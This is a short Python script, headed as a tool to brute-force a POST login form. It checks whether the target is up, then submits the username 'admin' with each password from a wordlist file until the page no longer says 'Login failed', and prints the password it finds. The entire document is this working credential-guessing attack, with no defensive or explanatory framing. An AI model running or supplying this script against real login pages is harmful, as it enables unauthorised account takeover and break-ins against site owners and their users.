#Script to brute a POST login form

import requests
import sys

url = sys.argv[1]

def request(url):
    try:
        return requests.get('http://' + url)
    except requests.exceptions.ConnectionError:
        pass

if request(url):
    print('[+] Target is up')
else:
    print('[-] Target is down')
    exit()

with open('passwords.txt', 'r') as wordlist_file:
    for line in wordlist_file:
        password = line.strip()
        response = requests.post(url, data={'username': 'admin', 'password': password, 'Login': 'submit'})
        if 'Login failed' not in response.content.decode():
            print('[+] Got the password --> ' + password)
            exit()
print('[-] Reached end of line')
